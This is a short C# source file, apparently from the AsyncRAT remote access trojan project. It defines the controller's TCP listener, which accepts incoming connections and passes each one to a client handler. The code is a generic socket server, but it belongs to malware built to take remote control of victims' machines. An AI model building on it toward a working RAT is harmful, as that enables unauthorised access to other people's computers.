﻿using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System;
using System.Threading;
using System.Windows.Forms;

namespace AsyncRAT_Sharp.Sockets
{
    class Listener
    {
        public Socket listener { get; set; }
        public static ManualResetEvent allDone = new ManualResetEvent(false);

        public void Connect(object port)
        {
            try
            {
                listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IPEndPoint IpEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
                listener.SendBufferSize = 50 * 1024;
                listener.ReceiveBufferSize = 50 * 1024;
                listener.ReceiveTimeout = -1;
                listener.SendTimeout = -1;
                listener.Bind(IpEndPoint);
                listener.Listen(20);

                while (true)
                {
                    allDone.Reset();
                    listener.BeginAccept(EndAccept, null);
                    allDone.WaitOne();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        public void EndAccept(IAsyncResult ar)
        {
            try
            {
                Clients CL = new Clients();
                CL.InitializeClient(listener.EndAccept(ar));
            }
            catch { }

            finally { allDone.Set(); }
        }
    }
}